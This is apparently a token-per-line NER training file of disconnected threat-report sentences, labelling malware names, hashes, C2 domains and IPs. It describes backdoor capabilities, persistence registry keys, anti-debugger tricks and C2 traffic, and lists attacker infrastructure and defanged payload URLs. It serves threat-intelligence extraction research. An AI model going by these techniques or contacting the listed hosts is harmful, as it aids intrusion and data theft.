Commit	O
to	O
Cybersecurity	O
Best	O
Practices	O

Novetta	O
has	O
observed	O
the	O
following	O
modules	O
:	O
Remote	O
command	O
shell	O
Network	O
tunneling	O
File	O
management	O
Derusbi	B-malware.backdoor
administrative	O
[	O
built-in	O
module	O
that	O
does	O
not	O
count	O
against	O
the	O
maximum	O
of	O
8	O
modules	O
per	O
variant	O
sample	O
]	O
Given	O
the	O
spacing	O
in	O
ID	O
numbers	O
(	O
as	O
noted	O
in	O
the	O
gap	O
between	O
0x82	O
and	O
0x84	O
in	O
an	O
otherwise	O
sequential	O
ID	O
scheme	O
)	O
,	O
it	O
is	O
conceivable	O
that	O
additional	O
modules	O
exist	O
.	O

The	O
Lucker	B-malware.backdoor
's	O
name	O
comes	O
from	O
the	O
PDB	O
path	O
of	O
this	O
type	O
of	O
Trojan	B-malware.backdoor
,	O
because	O
most	O
of	O
the	O
backdoor	O
's	O
function	O
use	O
the	O
LK	O
abbreviation	O
.	O

Figure	O
1	O
:	O
Standard	O
Gh0st	B-malware.backdoor
RAT	I-malware.backdoor
3.6	O
packet	O
login	O
request	O
|	O
Victim	O
to	O
controller	O

.text:00401683	O
finit	O
.text:00401686	O
fld	O
ds	O
:	O
tbyte_40168E	O
.text:0040168C	O
jmp	O
short	O
locret_401698	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
-.text:0040168E	O
tbyte_40168E	O
dt	O
9.2233720368547758075e18	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
-.text:00401698	O
locret_401698	O
:	O
.text:00401698	O
retn	O
This	O
float	O
value	O
causes	O
OllyDbg	O
to	O
crash	O
when	O
trying	O
to	O
display	O
its	O
value	O
.	O

Updates	O
for	O
BASS	O
Vulnerability	O
Spotlight	O
:	O
Foscam	O
IP	O
Video	O
Camera	O
Fi	O
...	O
Threat	O
Roundup	O
for	O
April	O
6	O
-	O
13	O
Vulnerability	O
Spotlight	O
:	O
Multiple	O
Vulnerabilities	O
...	O
Malware	O
monitor	O
-	O
leveraging	O
PyREBox	O
for	O
malware	O
a	O
...	O
Vulnerability	O
Spotlight	O
:	O
TALOS-2018-0529-531	O
-	O
Mul	O
...	O
Vulnerability	O
Spotlight	O
:	O
Multiple	O
Simple	O
DirectMed	O
...	O
Vulnerability	O
Spotlight	O
:	O
Multiple	O
Computerinsel	O
Ph	O
...	O
Microsoft	O
Patch	O
Tuesday	O
-	O
April	O
2018	O
IcedID	O
Banking	O
Trojan	O
Teams	O
up	O
with	O
Ursnif/Dreambo	O
...	O
Beers	O
with	O
Talos	O
EP26	O
:	O
Talos	O
is	O
Holding	O
a	O
Conferen	O
...	O
Critical	O
Infrastructure	O
at	O
Risk	O
:	O
Advanced	O
Actors	O
T	O
...	O
Vulnerability	O
Spotlight	O
:	O
Natus	O
NeuroWorks	O
Multiple	O
...	O
Vulnerability	O
Spotlight	O
:	O
Moxa	O
AWK-3131A	O
Multiple	O
F	O
...	O
Fake	O
AV	O
Investigation	O
Unearths	O
KevDroid	O
,	O
New	O
Andro	O
...	O
(	O
10	O
)	O
(	O
14	O
)	O
(	O
18	O
)	O
(	O
172	O
)	O
(	O
98	O
)	O
(	O
62	O
)	O
(	O
67	O
)	O
(	O
30	O
)	O
(	O
53	O
)	O

First	O
,	O
it	O
retrieves	O
the	O
name	O
of	O
the	O
file	O
from	O
Dino	B-malware.backdoor
's	O
configuration	O
(	O
'	O
a.ini	O
'	O
)	O
,	O
then	O
it	O
retrieves	O
the	O
key	O
to	O
decrypt	O
ramFS	O
,	O
and	O
it	O
finally	O
mounts	O
the	O
file	O
system	O
in	O
memory	O
in	O
order	O
to	O
execute	O
the	O
cleaner	O
file	O
stored	O
inside	O
.	O

then	O
the	O
malware	O
gets	O
the	O
list	O
of	O
backup	O
C2	O
servers	O
to	O
connect	O
by	O
downloading	O
a	O
text	O
file	O
from	O
the	O
Google	O
drive	O
link	O
.	O

The	O
last	O
new	O
feature	O
is	O
really	O
interesting	O
:	O
if	O
the	O
compromised	O
targets	O
block	O
a	O
specific	O
command	O
and	O
control	O
server	O
,	O
the	O
malware	O
will	O
continue	O
to	O
work	O
,	O
thanks	O
to	O
two	O
alternative	O
command	O
and	O
control	O
servers	O
.	O

1	O
*	O
Accept	O
:	O

2017	O
.	O

The	O
encrypted	O
strings	O
within	O
the	O
Trojan	B-malware.backdoor
include	O
fields	O
used	O
within	O
the	O
HTTP	O
requests	O
that	O
Cmstar	O
will	O
create	O
to	O
communicate	O
with	O
its	O
C2	O
server	O
,	O
as	O
well	O
as	O
additional	O
strings	O
used	O
to	O
interact	O
with	O
the	O
registry	O
.	O

Extracts	O

6	O
.	O

Mohamed	O
Morsi	O
,	O
after	O
winning.doc---------------.scr	O
'	O

cmd1	O
cmd2	O

While	O
ChessMaster	O
still	O
uses	O
the	O
previous	O
exploit	O
,	O
it	O
also	O
added	O
more	O
methods	O
to	O
its	O
arsenal	O
:	O
one	O
exploits	O
another	O
vulnerability	O
,	O
CVE-2017-11882	O
(	O
patched	O
in	O
November	O
2017	O
)	O
,	O
which	O
was	O
also	O
exploited	O
to	O
deliver	O
illegal	O
versions	O
of	O
the	O
Loki	B-malware.unknown
infostealer	O
.	O

Our	O
analysis	O
yields	O
indicators	O
about	O
the	O
identity	O
of	O
the	O
malware	O
we	O
have	O
analyzed	O
:	O
(	O
1	O
)	O
debug	O
strings	O
found	O
the	O
in	O
memory	O
of	O
infected	O
processes	O
appear	O
to	O
identify	O
the	O
product	O
and	O
(	O
2	O
)	O
the	O
samples	O
have	O
similarities	O
with	O
malware	O
that	O
communicates	O
with	O
domains	O
belonging	O
to	O
Gamma	O
International	O
.	O

The	O
attacker	O
uses	O
an	O
embedded	O
macro	O
in	O
order	O
to	O
execute	O
malicious	O
code	O
on	O
the	O
victim	O
's	O
system	O
.	O

MD5	O
:	O
797b450509e9cad63d30cd596ac8b608	B-hash

Obviously	O
,	O
attribution	O
is	O
a	O
complex	O
field	O
.	O

The	O
picture	O
below	O
showing	O
that	O
the	O
malware	O
is	O
capable	O
of	O
taking	O
pictures	O
from	O
the	O
camera	O
of	O
the	O
compromised	O
device	O
and	O
upload	O
it	O
to	O
the	O
C2	O
.	O

)	O
source	O
byte	O
to	O
produced	O
a	O
decrypted	O
character	O
.	O

Insisting	O
on	O
fileless	B-malware.unknown
operation	O
-	O
While	O
fileless	B-malware.unknown
delivery	O
infrastructure	O
is	O
not	O
a	O
feature	O
that	O
can	O
be	O
attributed	O
to	O
one	O
specific	O
group	O
,	O
it	O
is	O
still	O
worth	O
mentioning	O
since	O
the	O
attackers	O
went	O
out	O
of	O
their	O
way	O
to	O
restore	O
the	O
script-based	O
PowerShell	O
/	O
Visual	O
Basic	O
operation	O
,	O
especially	O
after	O
PowerShell	O
execution	O
had	O
been	O
disabled	O
in	O
the	O
entire	O
organization	O
.	O

Outlook	O
passwords	O

The	O
VBR	O
is	O
used	O
to	O
load	O
machine	O
code	O
into	O
RAM	O
to	O
start	O
a	O
program	O
.	O

Unsurprisingly	O
,	O
here	O
too	O
we	O
were	O
able	O
to	O
trace	O
back	O
a	O
portion	O
of	O
the	O
original	O
source	O
code	O
from	O
the	O
popular	O
rohitab.com	O
online	O
forum	O
.	O

T	O
he	O
timestamps	O
for	O
these	O
modules	O
are	O
from	O
December	O
2017	O
until	O
January	O
2018	O
.	O

A	O
series	O
of	O
xor	O
0x28	O
loops	O
decrypt	O
the	O
contents	O
of	O
a	O
self-deletion	O
batch	O
file	O
,	O
which	O
is	O
then	O
written	O
to	O
disk	O
and	O
executed	O
.	O

The	O
first	O
step	O
is	O
to	O
be	O
able	O
to	O
identify	O
phishing	O
attacks	O
and	O
distinguish	O
legitimate	O
emails	O
from	O
malicious	O
ones	O
.	O

Figure	O
13	O
:	O
Virtual	O
terminal	O
provides	O
a	O
command	O
shell	O
for	O
OS	O
interaction	O

GOPAL	O
GURUNG	O

The	O
following	O
is	O
a	O
screenshot	O
of	O
the	O
email	O
:	O

8ae2febe04102450fdbc26a38037c82b	B-hash
SHA-1	O
1fd0a268086f8d13c6a3262d41cce13470886b09	B-hash
SHA-256	O
ff6f0bcdb02a9a1c10da14a0844ed6ec6a68c13c04b4c122afc559d606762fa	B-hash

15	O
PostalCode	O
:	O
81379	O
City	O
:	O
Munich	O
CountryCode	O
:	O
DE	O
Phone	O
:	O
+49-89-2420918-0	O
Fax	O
:	O
+49-89-2420918-1	O
Email	O
:	O
info@gamma-international.de	O
Changed	O
:	O
2011-04-04T11:24:20+02:00	O
Martin	O
Muench	O
is	O
a	O
representative	O
of	O
Gamma	O
International	O
,	O
a	O
company	O
that	O
sells	O
'	O
advanced	O
technical	O
surveillance	O
and	O
monitoring	O
solutions	O
'	O
.	O

The	O
attackers	O
specifically	O
used	O
it	O
to	O
obtain	O
Outlook	O
passwords	O
.	O

This	O
same	O
keyword	O
was	O
also	O
found	O
in	O
the	O
njRAT	B-malware.backdoor
C2	O
communication	O
used	O
in	O
this	O
attack	O
as	O
shown	O
below	O
.	O

ACTIONABLE	O
INTELLIGENCE	O

The	O
Request	O
(	O
)	O
object	O
will	O
search	O
the	O
Query	O
String	O
for	O
any	O
keys	O
matching	O
the	O
input	O
.	O

Send	O
email	O
to	O
targets	O
instructing	O
them	O
to	O
reset	O
their	O
passwords	O
.	O

The	O
implant	O
is	O
able	O
to	O
hook	O
APIs	O
of	O
interest	O
in	O
dedicated	O
remote	O
processes	O
,	O
to	O
steal	O
data	O
on	O
the	O
fly	O
.	O

Last	O
time	O
,	O
we	O
identified	O
three	O
possible	O
hypotheses	O
to	O
explain	O
the	O
overlap	O
between	O
the	O
ScanBox	B-malware.infosteal
users	O
,	O
in	O
this	O
blog	O
,	O
based	O
on	O
the	O
data	O
we	O
have	O
available	O
,	O
we	O
can	O
settle	O
on	O
just	O
one	O
of	O
these	O
conclusions	O
:	O
2	O
.	O

The	O
ZxShell	B-malware.backdoor
service	O
handler	O
routine	O
is	O
only	O
a	O
stub	O
:	O
it	O
responds	O
to	O
each	O
service	O
request	O
code	O
,	O
doing	O
nothing	O
,	O
and	O
finally	O
exits	O
.	O

Trend	O
MicroTM	O
Deep	O
SecurityTM	O
and	O
Vulnerability	O
Protection	O
provide	O
virtual	O
patching	O
that	O
protects	O
endpoints	O
from	O
threats	O
such	O
as	O
malicious	O
redirections	O
to	O
malware-hosting	O
URLs	O
as	O
well	O
as	O
those	O
that	O
exploit	O
unpatched	O
vulnerabilities	O
.	O

downloadFile	O
:	O
toDirectory	O
:	O
fromServer	O
:	O
]	O

sub_44C1C0	O
(	O
)	O
seems	O
like	O
it	O
might	O
be	O
doing	O
some	O
pre-processing	O
on	O
the	O
encrypted	O
source	O
buffer	O
;	O
let	O
's	O
see	O
what	O
kind	O
of	O
pre-processing	O
it	O
is	O
doing	O
.	O

If	O
a	O
variant	O
is	O
developed	O
,	O
it	O
will	O
very	O
likely	O
use	O
the	O
same	O
C	O
&	O
C	O
protocol	O
,	O
but	O
may	O
change	O
the	O
header	O
of	O
the	O
packet	O
and	O
the	O
constants	O
used	O
for	O
connection	O
setup	O
.	O

DerusbiThread	O
:	O
:DerusbiThread	O
)	O
that	O
acts	O
as	O
the	O
primary	O
communication	O
loop	O
.	O

0DC102CFB87C937EEFFE01A06F94E229	B-hash
powerhost.zapto.org	B-url.cncsvr

Find	O
the	O
file	O
header	O
of	O
the	O
backup	O
VBR	O
within	O
a	O
file	O
editor	O
,	O
copy	O
from	O
the	O
header	O
to	O
footer	O
of	O
the	O
boot	O
sector	O
;	O
the	O
footer	O
will	O
always	O
be	O
55	O
AA	O
.	O

File	O
name	O
SHA-1	O
hash	O

The	O
delimiter	O
points	O
to	O
the	O
beginning	O
of	O
the	O
C2	O
hostname	O
:	O
port	O
pairs	O
.	O

Mark	O
the	O
file	O
%	O
TEMP%\~tmp085.dat	O
to	O
be	O
deleted	O
on	O
reboot	O
.	O

%	O
SYSTEM	O
%	O
\en-US	O
directory	O
will	O
have	O
multiple	O
system	O
files	O
in	O
it	O
,	O
so	O
it	O
is	O
chosen	O
to	O
blend	O
the	O
encrypted	O
payload	O
file	O
with	O
the	O
other	O
legitimate	O
system	O
files	O
.	O

Our	O
analysis	O
showed	O
that	O
the	O
malware	O
collects	O
a	O
wide	O
range	O
of	O
data	O
from	O
an	O
infected	O
victim	O
.	O

In	O
social	O
engineering	O
attacks	O
the	O
victim	O
is	O
tricked	O
into	O
clicking	O
accept	O
or	O
giving	O
the	O
attacker	O
physical	O
access	O
to	O
a	O
device	O
.	O

The	O
IXESHE	B-malware.backdoor
campaign	O
is	O
known	O
for	O
targeting	O
East	O
Asian	O
governments	O
,	O
electronics	O
manufacturers	O
,	O
and	O
telecommunications	O
firms	O
.	O

When	O
found	O
,	O
it	O
loads	O
the	O
related	O
attachment	O
,	O
drops	O
it	O
onto	O
the	O
hard	O
drive	O
as	O

In	O
our	O
test	O
environment	O
we	O
observed	O
that	O
the	O
POST	O
request	O
started	O
a	O
couple	O
of	O
hours	O
after	O
the	O
malware	O
initially	O
checked	O
in	O
with	O
the	O
CnC	O
.	O

MainHandler	O
:	O
handles	O
C	O
&	O
C	O
commands	O
and	O
controls	O
the	O
other	O
modules	O
based	O
on	O
the	O
commands	O
it	O
receives	O
from	O
the	O
C	O
&	O
C	O
.	O

CozyDuke	B-malware.drop
may	O
also	O
register	O
itself	O
as	O
a	O
Windows	O
service	O
or	O
scheduled	O
task	O
.	O

Furthermore	O
,	O
there	O
are	O
indications	O
that	O
APT32	B-malware.infosteal
actors	O
are	O
targeting	O
peripheral	O
network	O
security	O
and	O
technology	O
infrastructure	O
corporations	O
,	O
as	O
well	O
as	O
consulting	O
firms	O
that	O
may	O
have	O
connections	O
with	O
foreign	O
investors	O
.	O

DOMAIN	O
:	O
CBIBUAE.COM	B-url.cncsvr
•	O
Created	O
:	O
2014-06-14	O
•	O
Nameserver	O
:	O
nvhserver.com	B-url.cncsvr
DOMAIN	O
:	O
CBIUAEONLINE.COM	B-url.cncsvr
•	O
Created	O
:	O
2014-06-24	O
•	O
Updated	O
:	O
2014-07-03	O
•	O
Nameserver:aspnix.com	B-url.cncsvr
(	O
suspended-domain	O
)	O
DOMAIN	O
:	O
ROYALBSUK.COM	B-url.cncsvr
•	O
Created	O
:	O
2014-07-02	O
•	O
Updated	O
:	O
2014-07-06	O
•	O
Nameserver	O
:	O
(	O
suspended-domain	O
)	O
DOMAIN	O
:	O
CIBUAEONLINE.COM	B-url.cncsvr
•	O
Created	O
:	O
2014-11-27	O
•	O
Updated	O
:	O
2014-01-27	O
•	O
Nameserver	O
:	O
hostzeal.com	B-url.cncsvr
DOMAIN	O
:	O
CIBUAEONLINEBN.COM	B-url.cncsvr
•	O
Created	O
:	O
2014-11-28	O
•	O
Updated	O
:	O
2014-01-27	O
•	O
Nameserver	O
:	O
site4now.net	B-url.cncsvr
DOMAIN	O
:	O
CBIUAEONLINE.COM	B-url.cncsvr
•	O
Created	O
:	O
2014-12-10	O
•	O
Updated	O
:	O
2014-02-08	O
•	O
Nameserver	O
:	O
ok2host.com	B-url.cncsvr
DOMAIN	O
:	O
CBIUAEBANK.COM	B-url.cncsvr
•	O
Created	O
:	O
2015-04-29	O
•	O
Updated	O
:	O
2015-05-02	O
•	O
Nameserver	O
:	O
site4now.net	B-url.cncsvr
DOMAIN	O
:	O
CBIUAEBN.COM	B-url.cncsvr
•	O
Created	O
:	O
2015-04-29	O
•	O
Updated	O
:	O
2015-05-03	O
•	O
Nameserver	O
:	O
ok2host.com	B-url.cncsvr
Correlating	O
the	O
increasing	O
amounts	O
of	O
information	O
,	O
root9B	O
analysts	O
have	O
determined	O
that	O
the	O
adversary	O
responsible	O
for	O
the	O
initial	O
attack	O
in	O
June	O
2014	O
was	O
almost	O
certainly	O
the	O
same	O
,	O
or	O
very	O
closely-related	O
to	O
the	O
entity	O
responsible	O
for	O
creating	O
at	O
least	O
two	O
of	O
the	O
domains	O
in	O
April	O
2015	O
.	O

page	O
|	O
4	O

RobototFontUpdate	O
icon	O

We	O
have	O
previously	O
observed	O
APT19	B-malware.infosteal
steal	O
data	O
from	O
law	O
and	O
investment	O
firms	O
for	O
competitive	O
economic	O
purposes	O
.	O

The	O
myth	O
of	O
Babar	B-malware.drop
has	O
been	O
around	O
for	O
a	O
while	O
in	O
the	O
intelligence	O
community	O
.	O

Both	O
embedded	O
executable	O
files	O
are	O
obfuscated	O
with	O
an	O
XOR	O
operation	O
using	O
a	O
single-byte	O
hexadecimal	O
key	O
of	O
0x62	O
,	O
but	O
both	O
the	O
XOR	O
byte	O
and	O
the	O
Null	O
byte	O
(	O
0x00	O
)	O
is	O
skipped	O
.	O

Steal	O
credentials	O
from	O
Internet	O
Explorer	O

Upload	O
&	O
Execute	O
additional	O
malware	O
,	O
typically	O
exploiting	O
vulnerabilities	O
derived	O
from	O
collected	O
system	O
information	O
Capture	O
Webcam	O
and	O
Microphone	O
,	O
without	O
user	O
notification	O
Remote	O
Desktop	O
to	O
watch	O
user	O
activity	O
File	O
Manager	O
allowing	O
access	O
to	O
files	O
in	O
the	O
context	O
of	O
the	O
current	O
user	O
Browser	O
Password	O
theft	O
Keylogging	O
to	O
capture	O
passwords	O
otherwise	O
obscured	O
from	O
viewing	O
In	O
the	O
past	O
,	O
variants	O
of	O
the	O
DarkComet	B-malware.backdoor
and	O
AcromRAT	B-malware.backdoor
malware	O
have	O
also	O
been	O
observed	O
beaconing	O
to	O
the	O
same	O
Command	O
&	O
Control	O
(	O
CnC	O
)	O
servers	O
used	O
by	O
the	O
Unrecom	B-malware.backdoor
RAT	I-malware.backdoor
in	O
this	O
campaign	O
.	O

1.9.5.38	B-ip.unknown
103.255.61.227	B-ip.unknown
118.193.153.221	B-ip.unknown
118.193.153.227	B-ip.unknown
174.121.122.73	B-ip.unknown

netsat.exe	O

These	O
patterns	O
can	O
be	O
searched	O
for	O
when	O
doing	O
memory	O
analysis	O
of	O
a	O
victim	O
system	O
.	O

Finally	O
,	O
it	O
spawns	O
the	O
main	O
thread	O
that	O
starts	O
at	O
the	O
original	O
location	O
of	O

As	O
Cyber	O
Threat	O
analysts	O
continued	O
to	O
follow	O
the	O
indicators	O
,	O
they	O
uncovered	O
a	O
global	O
attack	O
in	O
the	O
making	O
,	O
and	O
took	O
steps	O
to	O
protect	O
not	O
only	O
our	O
clients	O
,	O
but	O
other	O
identified	O
victims	O
as	O
well	O
.	O

We	O
base	O
this	O
on	O
the	O
fact	O
that	O
the	O
attacker	O
initially	O
obtained	O
a	O
reliable	O
foothold	O
on	O
the	O
DCS	O
and	O
could	O
have	O
developed	O
the	O
capability	O
to	O
manipulate	O
the	O
process	O
or	O
shutdown	O
the	O
plant	O
,	O
but	O
instead	O
proceeded	O
to	O
compromise	O
the	O
SIS	O
system	O
.	O

f	O
.	O

In	O
this	O
case	O
the	O
cyber	O
espionage	O
group	O
targeted	O
Mazagon	O
Dock	O
Shipbuilders	O
Limited	O
(	O
MDL	O
)	O
but	O
it	O
is	O
possible	O
that	O
other	O
defense	O
equipment	O
manufacturers	O
could	O
also	O
be	O
targeted	O
as	O
part	O
of	O
this	O
attack	O
campaign	O
.	O

This	O
data	O
can	O
contain	O
very	O
useful	O
hints	O
to	O
help	O
group	O
attacks	O
and	O
attribute	O
them	O
to	O
actors	O
,	O
similar	O
to	O
what	O
we	O
have	O
previously	O
described	O
in	O
our	O
Poison	O
Ivy	O
whitepaper	O
.	O

However	O
,	O
it	O
only	O
checks	O
against	O
the	O
last	O
two	O
,	O
and	O
,	O
if	O
matching	O
,	O
the	O
malware	O
quits	O
.	O

Joshua	O
Ray	O
joshua.a.ray@accenture.com	O
Bart	O
Parys	O
bart.parys@accenture.com	O

Analysis	O
of	O
CVE-2018-8174	B-malware.unknown
VBScript	O
0day	O
and	O
APT	O
actor	O
related	O
to	O
Office	O
targeted	O
attack	O
Lock	O
.	O

The	O
malware	O
had	O
self-propagating	O
qualities	O
and	O
was	O
designed	O
to	O
overwrite	O
data	O
on	O
disks	O
attached	O
to	O
or	O
accessible	O
from	O
targeted	O
systems	O
.	O

FIGURE	O
2	O
:	O
THE	O
COZYDUKE	B-malware.drop
INFECTION	O
FLOW	O

Encrypted	O
data	O
sent	O
to	O
CnC	O
It	O
encrypts	O
information	O
it	O
collects	O
with	O
the	O
base64	O
algorithm	O
and	O
then	O
sends	O
it	O
to	O
the	O
remote	O
CnC	O
server	O
as	O
seen	O
in	O
Figure	O
4	O
.	O

Importantly	O
,	O
we	O
believe	O
that	O
our	O
list	O
of	O
servers	O
is	O
incomplete	O
due	O
to	O
the	O
large	O
diversity	O
of	O
ports	O
used	O
by	O
FinSpy	B-malware.backdoor
servers	O
,	O
as	O
well	O
as	O
other	O
efforts	O
at	O
concealment	O
.	O

We	O
hope	O
that	O
further	O
research	O
will	O
help	O
to	O
shed	O
light	O
on	O
this	O
practice	O
and	O
the	O
companies	O
that	O
make	O
these	O
services	O
available	O
.	O

The	O
first	O
release	O
time	O
of	O
Cobalt	O
Strike	O
is	O
June	O
,	O
2012	O
.	O

File	O
Name	O
:	O
lremit_Transfer_Error_Page.jar	B-malware.infosteal
File	O
Size	O
:	O
43861	O
bytes	O
MD5	O
:	O
8811a91e0ef5b181b1f0433d913faaaf	B-hash
SHA1	O
:	O
ca771a56a8e63565b0638e84bac0db0e6c0fadf8	B-hash

Another	O
URL	O
,	O
http://ynetnewes[.]com/resources/assets/downloads/svchost.exe	B-url.unknown

As	O
you	O
can	O
see	O
from	O
the	O
pictures	O
below	O
,	O
the	O
original	O
PDF	O
was	O
modified	O
using	O
the	O
Ghostscript	O
tool	O
.	O

acelpvc.dll	O
is	O
used	O
to	O
stream	O
live	O
desktop	O
feeds	O
to	O
the	O
attacker	O
VedioDriver.dll	O
(	O
presence	O
of	O
this	O
file	O
does	O
not	O
necessarily	O
imply	O
an	O
infection	O
)	O
-	O
Helper	O
dll	O
for	O
acelpvc.dll	O
http://vil.nai.com/vil/content/v_253416.htm	B-url.unknown
Trojan.Hydraq	O
Outbound	O
network	O
connections	O
to	O
'	O
hxxp://demo[remove].jpg	B-url.unknown
'	O
The	O
presence	O
of	O
the	O
following	O
files	O
:	O
%	O
SystemDir%\Rasmon.dll	O
%	O
SYSDIR%\DFS.bat	O
The	O
presence	O
of	O
the	O
following	O
registry	O
keys	O
:	O
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RaS	O
[	O
%	O
random	O
4	O
chars	O
%	O
]	O
'	O
ImagePath	O
'	O
=	O
%	O
SystemRoot%\svchost.exe	O
-k	O
netsvcs	O
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RaS	O
[	O
%	O
random	O
4	O
chars	O
%	O
]	O
'	O
Start'=	O
02	O
,	O
00	O
,	O
00	O
,	O
00	O
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RaS	O
[	O
%	O
random	O
4	O
chars	O
%	O
]	O
\Parameters	O
'	O
ServiceDll	O
'	O
=	O
%	O
SystemRoot%\rasmon.dll	O
Aurora	B-malware.infosteal
demonstrates	O
these	O
four	O
infection	O
characteristics	O
:	O

It	O
's	O
very	O
likely	O
the	O
vector	O
for	O
this	O
campaign	O
was	O
simply	O
social	O
engineering	O
-	O
in	O
other	O
words	O
asking	O
the	O
user	O
to	O
click	O
'	O
ok	O
'	O
.	O

JPEG	O
image	O
contained	O
in	O
EXE	O
file	O
0AA7B256D2DCC8BD3914F895B134B225	B-hash

Well	O
,	O
it	O
turns	O
out	O
that	O
the	O
bot	O
is	O
riddled	O
with	O
vast	O
numbers	O
of	O
WinSock2	O
calls	O
;	O
not	O
surprising	O
,	O
since	O
DarkComet	B-malware.backdoor
has	O
a	O
great	O
deal	O
of	O
RAT	O
functions	O
that	O
require	O
network	O
communication	O
.	O

The	O
service	O
function	O
which	O
obtains	O
addresses	O
of	O
API	O
functions	O
:	O
The	O
version	O
in	O
mrxcls	O
uses	O
the	O
function	O
MmGetSystemRoutineAddress	O
for	O
this	O
purpose	O
and	O
the	O
respective	O
text	O
names	O
of	O
the	O
addresses	O
of	O
incoming	O
API	O
functions	O
.	O

In	O
other	O
cases	O
,	O
the	O
attackers	O
registered	O
and	O
built	O
malicious	O
websites	O
:	O
users-management[.]com	B-url.normal

Although	O
we	O
are	O
unable	O
to	O
link	O
this	O
campaign	O
to	O
any	O
already	O
documented	O
in	O
open	O
source	O
,	O
it	O
bears	O
similarities	O
to	O
some	O
described	O
by	O
others	O
previously.The	O
earliest	O
samples	O
in	O
the	O
campaign	O
we	O
have	O
identified	O
date	O
back	O
to	O
the	O
summer	O
of	O
2014	O
.	O

POST	O
/	O
HTTP/1.1	O
Accept-Language	O
:	O
en-en	O
Content-Type	O
:	O
application/octet-stream	O
Pragma	O
:	O
no-cache	O
Cache-Control	O
:	O
max-age=259200	O
Content-Length	O
:	O
1572	O
User-Agent	O
:	O
Mozilla/4.0	O
(	O
compatible	O
;	O
MSIE	O
6.0;Windows	O
NT	O
5.1	O
)	O
Host	O
:	O
ct.datangcun[.]com:1353\x0d\	O
x0a\x0d\x0a\xcf\xcf	O

There	O
is	O
no	O
specific	O
pattern	O
to	O
this	O
attack	O
,	O
we	O
have	O
seen	O
days	O
on	O
which	O
multiple	O
weaponized	O
emails	O
were	O
sent	O
to	O
several	O
companies	O
,	O
and	O
on	O
other	O
days	O
we	O
observed	O
that	O
the	O
threat	O
actor	O
sent	O
only	O
one	O
email	O
to	O
a	O
specific	O
target	O
organization	O
.	O

How	O
Today	O
's	O
Attacks	O
are	O
Manufactured	O

The	O
data	O
is	O
compressed	O
with	O
LZMA	O
and	O
encrypted	O
with	O
AES	O
,	O
however	O
,	O
the	O
keys	O
are	O
stored	O
in	O
the	O
malware	O
body	O
which	O
makes	O
it	O
possible	O
to	O
decrypt	O
the	O
information	O
from	O
the	O
C	O
&	O
C	O
.	O

The	O
earliest	O
CozyDuke	B-malware.drop
sample	O
we	O
have	O
observed	O
so	O
far	O
was	O
compiled	O
on	O
the	O
29	O
of	O
December	O
,	O
2011	O
.	O

There	O
are	O
several	O
other	O
behavioral	O
aspects	O
that	O
can	O
be	O
used	O
for	O
detection	O
.	O

This	O
is	O
a	O
full-featured	O
backdoor	O
that	O
offers	O
its	O
operators	O
many	O
capabilities	O
,	O
such	O
as	O
file	O
,	O
registry	O
and	O
process	O
manipulation	O
,	O
loading	O
additional	O
components	O
,	O
and	O
performing	O
a	O
system	O
fingerprint	O
.	O

For	O
example	O
,	O
the	O
command	O
(	O
111	O
)	O
uninstalls	O
the	O
real	O
application	O
'	O
URLShortener	O
'	O
:	O
Will	O
result	O
in	O
:	O
By	O
connecting	O
to	O
the	O
real	O
C2	O
IP	O
address	O
,	O
Cyberkov	O
found	O
that	O
the	O
malware	O
is	O
really	O
of	O
JSocket/AlienSpy	B-malware.backdoor
family	O
of	O
RATs	O
since	O
that	O
family	O
of	O
RATs	O
open	O
the	O
port	O
1234	O
with	O
a	O
self-signed	O
certificate	O
of	O
'	O
assylias	O
'	O
.	O

Although	O
we	O
are	O
not	O
sure	O
this	O
particular	O
work	O
is	O
actually	O
hers	O
,	O
we	O
did	O
find	O
a	O
reference	O
to	O
a	O
similarly	O
named	O
article	O
'	O
Pakistan	O
's	O
UAV	O
programme	O
:	O
Ambitious	O
,	O
with	O
some	O
friendly	O
help	O
.	O
'	O

File	O
Date	O
Countries	O
of	O
Submission	O

The	O
compiled	O
code	O
itself	O
already	O
is	O
altered	O
per	O
deployment	O
in	O
multiple	O
subtle	O
ways	O
,	O
in	O
order	O
to	O
stymie	O
identification	O
and	O
automated	O
analysis	O
and	O
accommodate	O
targeted	O
environments	O
.	O

Detailed	O
analysis	O
of	O
the	O
code	O
found	O
in	O
rtniczw.sys	O
identified	O
no	O
other	O
differences	O
from	O
the	O
'	O
reference	O
'	O
driver	O
:	O
this	O
was	O
the	O
same	O
mrxcls.sys	O
file	O
,	O
created	O
in	O
the	O
same	O
year	O
,	O
on	O
the	O
same	O
day	O
and	O
hour	O
-	O
on	O
1	O
January	O
2009	O
.	O

The	O
INI	O
file	O
contains	O
the	O
Base64	O
encoded	O
PowerShell	O
command	O
,	O
which	O
will	O
be	O
decoded	O
and	O
executed	O
by	O
PowerShell	O
using	O
the	O
command	O
line	O
generated	O
by	O
the	O
VBS	O
file	O
on	O
execution	O
using	O
WScript.exe	O
.	O

Sample	O
#	O
2	O
is	O
designed	O
to	O
run	O
and	O
spread	O
a	O
malicious	O
payload	O
on	O
the	O
victim	O
's	O
network	O
.	O

If	O
invoked	O
with	O
no	O
targets	O
,	O
it	O
runs	O
the	O
device	O
discovery	O
function	O
detect_ip	O
.	O

Unfortunately	O
,	O
this	O
theory	O
has	O
not	O
been	O
confirmed	O
-	O
Jmidebs.sys	O
has	O
never	O
been	O
detected	O
anywhere	O
.	O

Instead	O
of	O
finding	O
API	O
function	O
names	O
based	O
on	O
their	O
hashed	O
values	O
,	O
this	O
malware	O
enumerates	O
libraries	O
'	O
export	O
address	O
table	O
(	O
EAT	O
)	O
and	O
searches	O
for	O
the	O
name	O
of	O
the	O
API	O
function	O
the	O
payload	O
needs	O
to	O
load	O
by	O
using	O
a	O
character	O
to	O
offset	O
array	O
.	O

All	O
these	O
files	O
have	O
something	O
in	O
common	O
:	O
A	O
decoy	O
document	O
is	O
